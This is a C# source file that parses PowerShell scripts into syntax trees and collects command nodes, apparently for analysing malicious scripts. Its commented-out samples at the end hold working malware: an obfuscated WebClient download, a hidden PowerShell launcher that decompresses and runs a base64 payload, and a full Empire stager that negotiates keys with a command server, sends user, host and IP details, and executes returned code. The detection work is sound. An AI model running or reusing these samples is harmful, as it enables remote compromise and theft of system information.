using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation.Language;
using System.Text;
using System.Threading.Tasks;

namespace TraceEvent2.PowerShellInteract
{
    public class ASTParser // accessible to other project
    {
        String sampleScript;

        public ASTParser(String sampleScript) => this.sampleScript = sampleScript;

        public void Parser()
        {
            ScriptBlockAst sb = System.Management.Automation.Language.Parser.ParseInput(sampleScript, out Token[] tokens, out ParseError[] errors);

            // AST type list https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.language?view=powershellsdk-1.1.0
            //var cmdAst = sb.FindAll(delegate (Ast t) { return t is System.Management.Automation.Language.CommandAst; }, true);
            //var funcAst = sb.FindAll(delegate (Ast t) { return t is System.Management.Automation.Language.FunctionDefinitionAst; }, true);

            FindAllVisitor treeWalker = new FindAllVisitor();
            FindAllVisitor.Visit(sb);

#if DEBUG
            System.Diagnostics.Debugger.Break();
#endif
        }
    }

    class FindAllVisitor : AstVisitor
    {
        private List<Ast> commandAstList = new List<Ast>();

        void Initialize(Ast ast)
        {

        }

        public static void Visit(Ast ast)
        {
            if (!(ast is ScriptBlockAst || ast is FunctionMemberAst || ast is FunctionDefinitionAst))
            {

            }

            var visitor = new FindAllVisitor();

             if (ast is ScriptBlockAst)
                (ast as ScriptBlockAst).Visit(visitor);
            else if (ast is FunctionDefinitionAst)
                (ast as FunctionDefinitionAst).Body.Visit(visitor);
            else if (ast is FunctionMemberAst && (ast as FunctionMemberAst).Parameters != null)
                visitor.VisitParameters((ast as FunctionDefinitionAst).Parameters);

            List<string> commandList = new List<string>();
            foreach(var command in visitor.commandAstList)
            {
                string commandString = command.Extent.ToString();
                commandString = commandString.ToLower();
                commandList.Add(commandString);
            }

            return;
        }

        internal void VisitParameters(IReadOnlyCollection<ParameterAst> parameters)
        {
            foreach (var t in parameters)
            {
                var variableExpressionAst = t.Name;
                var varPath = variableExpressionAst.VariablePath;
            }
        }

        public override AstVisitAction VisitScriptBlock(ScriptBlockAst scriptBlockAst)
        {
            return AstVisitAction.Continue;
        }

        public override AstVisitAction VisitFunctionDefinition(FunctionDefinitionAst functionDefinitionAst)
        {
            return AstVisitAction.Continue;
        }

        public override AstVisitAction VisitCommand(CommandAst commandAst)
        {
            commandAstList.Add(commandAst);
            return AstVisitAction.Continue;
        }
    }
}


/* Samples */
// string sampleScript = "&('Ne'+'w-'+'obje'+'ct') system.net.webclient; $wc.downloadstring((('C:c'+('{1}{0}' -f 'Users','rf')+'crf'+'Zh'+('{1}{0}' -f'ua','eny')+('{0}{1}' -f'n L','i')+'c'+('{1}{0}'-f'Docu','rf')+('{2}{0}{1}'-f 'tscr','f','men')+'G'+'i'+('{2}{5}{0}{1}{4}{3}' -f'fInvoke-Obfu','sc','t','ionc','at','Hubcr')+('{0}{2}{1}'-f'rfL','E','ICENS')) -rEPlACe'crf',[ChaR]92))";
// string sampleScript = "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAJrcOFgCA71WbW/aSBD+3Er9D1aFZFslGBLSpJEq3drG4AAJxMEEOFRt7LW9ZPESe81br//9xrwk5Jr2ev1wViJ2PTO7zz7zzI6DLPYE5bE0WTdsk345e/wofX339k0HJ3gqKYXYOV0M42UWFaXC5Ky8ovzx3pnXmuqbN+BVeLw0+bDPToeXflP6LCkjNJuZfIppPL64MLIkIbHYzkt1IlCakuk9oyRVVOkvqR+RhBxd30+IJ6SvUuFLqc74PWY7t5WBvYhIRyj2c1uLezhHWnJmjApF/vNPWR0dVcal2mOGWarIzioVZFryGZNV6Zuab3i7mhFFblMv4SkPRKlP45PjUi9OcUCuYLU5aRMRcT+VVTgN/CVEZEksvThXvtDWTZFh2Em4h3w/ISlElex4zh8I8JQxVpT+UEY7FDdZLOiUgF2QhM8cksypR9JSA8c+IzckGCtXZLE//K8GKYdB4NURiVqELP0Ebpv7GSPbFWT1e8DPGVbh+WeWgZZv796+exvsZTIv191DgcDozWgzJoBZ6fCUbvw+S+Wi1IZdseDJCqaF2yQj6lga5TkZjcdSgUzOiz8Or+x9wRMvudVvkWhRsb6AaeRy6o8hdJe0gtfPmivjdJ3bfixAkwQ0JuYqxlPq7TWmvJYGEjCyOW5p73YFABV5ZyC+SRgJscgJLUqj78NqUyqeYvWMMp8kyINUpoAKsqy+BLPNkSLbcZtMga7tXIZkBKBssvfeqXm13z2fg5NsMJymRamTQWl5RckhmBG/KKE4pTsTygTfDOVnuO2MCerhVOyXG6uHXO72NHiciiTzIItw/ltnRjyKWU5HUWpQn+grh4b7veVXyTAwYzQOYaU5JAPe5CQ4ItdGAjBzHaglhwh7OmNkCi6bMrcYDqGodyWx0RIOiS+/BnIv9622c0r2XBxAhDw7jIui5NJEwI2R03sorN9CcnBlPGEyErJLjrIvn5G+ErnoC1nXjs77a/s2l+qOqg0xiQBSrIRPdZySj1VHJECZ8l67pgaCZ2DHrO3pD7SCFrRit+G/R09sbp75zctJQ0vMZRQgO7XbjY7ZbTSq80vHrQqnZotmxxbt2t1k4qDGTW8ghjZq3NLyw6C6nl3StdNC/mCpfVzr60VZX64noR8MzCAIzwLnpnJq0Vbf6OrlY9wya1mrry/0cjWt0UWjS3vdh0tL3A9chnuBFt5VPmG6bCUTt8LbaxuhenTirS8Dtx61/dWgoX3qVx9QDSEjrrmWzpsDPUEdzcWhyxfNUK/VQwPplkfJsNuz9G7X0lGvPnk0P2khxN7hSO+7x3Q4u7uJYG4BhKZWrto+WfNBF0iqc4TDG/AJjWMvCsDH/ID0D1c8PcYPOkc6+FjDR8A1mFkdBvbb3jFHLru6w6g1XFmaVhl0qqhRpv16iPIlcah3MUrn5trUKq7P/f7p1SDQ3Dt2ppnG7cwLNE1bNMymN6wsz6/Pzlt96k456mma+z4XCCik4HdabbuBgl5Ubx3k/Ue3fRsnaYQZ6AGu731xWjyxdndwh9M8QlEOWvYDSWLCoLdB99sLHDHGvbw9bO5saE3bhjGGIu3B8OT41ZEqPTmqz+1i/+riYghYoVSehFxqkTgUUbG8PCmX4c4vL6tlOPivH9Lgs5XyvF4xbxwvKHuxG9vspuZFVVgMqsZA8P+D0l1NR/Dj/xulz+9+Yv0lmsvFl0R8Z3754j/R/ptE9DEV4O/A7cTItm2+zsdOTQdfHLt0gVKC3ZN/BF5n4ugKvkX+BuPhEqyJCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);";
// sampleScript = @"FuNcTioN StART-NegotiATe {paRAM($s,$SK,$UA='MoziLLA / 5.0(WiNdowS NT 6.1; WOW64; TrIDENt / 7.0; RV: 11.0) LIkE GECko')fUNctiON COnVErTTO-RC4BYTEStreAm {PaRam ($RCK, $In)BeGin {[BytE[]] $STr = 0..255;$J = 0;0..255 | ForEaCh-OBjECT {$J = ($J + $StR[$_] + $RCK[$_ % $RCK.LENgtH]) % 256;$STR[$_], $STr[$J] = $STR[$J], $STr[$_];};$I = $J = 0;}pRoCeSs {FOrEacH($Byte In $IN) {$I = ($I + 1) % 256;$J = ($J + $Str[$I]) % 256;$StR[$I], $Str[$J] = $StR[$J], $Str[$I];$BYte -BxoR $Str[($STR[$I] + $STR[$J]) % 256];}}}FuNCtiON DeCrYPT-ByTeS {paraM ($Key, $IN)iF($IN.LENGth -gt 32) {$HMAC = New-OBJEcT SYsTEm.SEcUritY.CrYptOGrapHY.HMACSHA256;$E=[SYsTEm.TExt.EnCoDiNg]::ASCII;$Mac = $In[-10..-1];$IN = $In[0..($In.LengTh - 11)];$HmaC.KeY = $E.GETBYTeS($KeY);$EXpecTeD = $hmAC.COMPuTeHAsh($IN)[0..9];IF (@(COmpARE-ObJECT $MaC $ExpeCTEd -SyNC 0).LeNgth -ne 0) {RETuRN;}$IV = $IN[0..15];tRY {$AES=NEW-OBJECT SystEM.SeCuRIty.CryPTOgraphY.AEsCrYPtOServiCePROVidEr;}CatcH {$AES=New-OBjEct SYstem.SecUrItY.CRYPtogRaPhy.RIJndaELManagED;}$AES.Mode = 'CBC';$AES.Key = $e.GEtBYtEs($KEy);$AES.IV = $IV;($AES.CReaTEDEcRyptoR()).TRanSFoRMFINalBLOcK(($IN[16..$In.LENGTH]), 0, $IN.LeNgth-16)}}$Null = [Reflection.Assembly]::LoadWithPartialName('System.Security');$Null = [Reflection.Assembly]::LoadWithPartialName('System.Core');$ErrorActionPreference = 'SilentlyContinue';$e=[SysTem.TeXt.ENcODING]::ASCII;$customHeaders = '';$SKB=$e.GETBYTES($SK);TRY {$AES=NEw-Object SySTeM.SECurIty.CRYPtOGRAPHY.AESCRyPToSERvIcEPROvideR;}CaTCh {$AES=New-ObjecT SysTEm.SECUritY.CrYPTograPhY.RijnDaeLMaNageD;}$IV = [BYTe] 0..255 | GEt-RanDom -cOUnt 16;$AES.Mode='CBC';$AES.Key=$SKB;$AES.IV = $IV;$HmAc = New-OBjecT SysteM.SECURItY.CryptoGRaphy.HMACSHA256;$HMaC.KEy = $SKB;$cSP = NEW-ObJEcT SYStEM.SecuRIty.CryPtogrAphY.CSpPARAmeters;$cSp.Flags = $cSP.FLAGs -bOR [SYsTeM.SECuRItY.CrYptOgrAphY.CsPPrOvidERFlAgs]::USEMaChiNeKEYSTorE;$rs = NeW-OBjeCt SYSTem.SEcURiTy.CryPToGrApHy.RSACrypToSErVIcEPROvIdeR -ARGumenTLISt 2048,$csP;$rk=$rs.ToXmlSTRINg($FAlSe);$ID=-join('ABCDEFGHKLMNPRSTUVWXYZ123456789'.ToCharArray()|Get-Random -Count 8);$IB=$E.geTBytES($RK);$EB=$IV+$AES.CREATEEnCryPtOr().TranSFormFINaLBlOck($ib,0,$iB.LenGtH);$eB=$eB+$hMac.CoMpUtEHash($eB)[0..9];if(-NOT $wc) {$wC=NEW-ObJecT SySTEm.Net.WEBCliENT;$WC.PrOxy = [SYstEm.NET.WEBReQuest]::GeTSysTemWEBPROXY();$Wc.PRoXY.CRedeNtIaLs = [SyStEm.Net.CreDentialCache]::DefAULtCrEdeNtialS;}if ($ScriPT:ProxY) {$WC.PRoxY = $ScrIpt:PROxy;}if ($customHeaders -ne '') {$hEaDErs = $customHEADERs -SpLIt ',';$HEAderS | ForEaCH-ObjECt {$HeADERKeY = $_.sPlIt(':')[0];$heAdeRVaLUe = $_.SplIt(':')[1];if ($headerKey -eq 'host'){Try{$iG=$WC.DOWnlOADDAta($s)}CaTCH{}};$Wc.HeAdERs.ADD($HEaderKEy, $HEaDerVAlUe);}}$wc.Headers.Add('User - Agent',$UA);$IV=[BitConvERTer]::GEtByTES($(Get-RAndOm));$DaTa = $e.GEtbYtEs($ID) + @(0x01,0x02,0x00,0x00) + [BitCOnvERTeR]::GeTBYTEs($EB.LengtH);$RC4p = COnVeRtTO-RC4ByteSTREAM -RCK $($IV+$SKB) -In $Data;$rc4P = $IV + $rC4P + $EB;$raw=$wc.UploadData($s+' / login / process.php','POST',$rc4p);$De=$e.GEtSTRiNG($Rs.dECRYPt($RAw,$falSE));$NOnCe=$DE[0..15] -JoIN '';$key=$De[16..$de.LEngth] -jOiN '';$nOnCE=[STrING]([LonG]$nonCE + 1);trY {$AES=NEW-OBjEcT SySTEM.SEcURITy.CryPTOgRaPhy.AESCRyPtoSERvIcEPROVIdEr;}caTcH {$AES=NEw-OBJect SYSTem.SECUriTy.CRyPTOGrAPhY.RijNdaELManagEd;}$IV = [BytE] 0..255 | GET-RandoM -Count 16;$AES.Mode='CBC';$AES.KeY=$e.GEtBYTES($key);$AES.IV = $IV;$I=$nonCe+' | '+$s+' | '+[ENViRoNmenT]::UserDoMaINNamE+' | '+[ENViRONMent]::UsERNAMe+' | '+[ENVIrOnmENT]::MAcHIneNaME;TrY{$p=(GwmI Win32_NetwORKADaPtERCOnfigURaTiON|WhErE{$_.IPADdReSS}|SElecT -EXPANd IPAdDreSs);}CatCH {$p = '[FAILED]'}$Ip = @{$True=$p[0];$fAlSe=$P}[$P.LengTH -Lt 6];if(!$Ip -OR $ip.TriM() -Eq '') {$iP='0.0.0.0'};$i+=' |$ip';TRy{$I+=' | '+(Get-WmiObJEct WIN32_OPERaTiNgSysteM).NamE.sPLit(' | ')[0];}CATCH{$I+=' | '+'[FAILED]'}if(([Environment]::UserName).ToLower() -eq 'system'){$i+=' | True'}else {$i += ' | ' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')}$n=[SYSteM.DiaGnOSTICS.PROceSs]::GeTCURREnTPROCESS();$I+=' | '+$n.PROcEsSName+' | '+$N.ID;$i += ' | powershell | ' + $PSVersionTable.PSVersion.Major;$iB2=$e.GetbytEs($i);$eB2=$IV+$AES.CReaTeEncRyPTor().TraNsfOrMFinAlBLOcK($IB2,0,$IB2.LeNgth);$hMAC.KEy = $E.GETByTEs($kEy);$eB2 = $eB2+$hMaC.COmpUteHaSh($EB2)[0..9];$IV2=[BiTCoNVerter]::GetByTes($(GeT-RAnDOM));$DAtA2 = $e.GeTbYtES($ID) + @(0X01,0X03,0X00,0x00) + [BitCoNvErtER]::GETBYTeS($EB2.LENgTh);$Rc4p2 = COnVertTO-RC4BYteStream -RCK $($IV2+$SKB) -In $daTa2;$rC4P2 = $IV2 + $RC4p2 + $Eb2;if ($customHeaders -ne '') {$HeaDErs = $cuStOMHeaDErS -SpLiT ',';$HeADERs | ForEacH-ObjecT {$hEadERKey = $_.SpLiT(':')[0];$heaDERVaLuE = $_.splIT(':')[1];if ($headerKey -eq 'host'){TRY{$IG=$WC.DowNlOadDATa($S)}cATcH{}};$Wc.HEADErs.Add($headErKEy, $heaDErValue);}}$wc.Headers.Add('User - Agent',$UA);$raw=$wc.UploadData($s+' / login / process.php','POST',$rc4p2);IEX $( $e.GeTStRInG($(DecrYPT-BytES -KEy $key -In $rAW)) );$AES=$Null;$s2=$NulL;$wC=$nuLL;$Eb2=$nulL;$RAW=$NuLL;$IV=$nUlL;$wC=$nuLL;$I=$nuLL;$ib2=$NulL;[GC]::ColLeCT();Invoke-Empire -Servers @(($s -split ' / ')[0..2] -join ' / ') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours 'WORKING_HOURS_REPLACE' -KillDate 'REPLACE_KILLDATE' -ProxySettings $Script:Proxy;}Start-Negotiate -s '$ser' -SK '4bde6a2795339b5fd913e710b232540e' -UA $u;";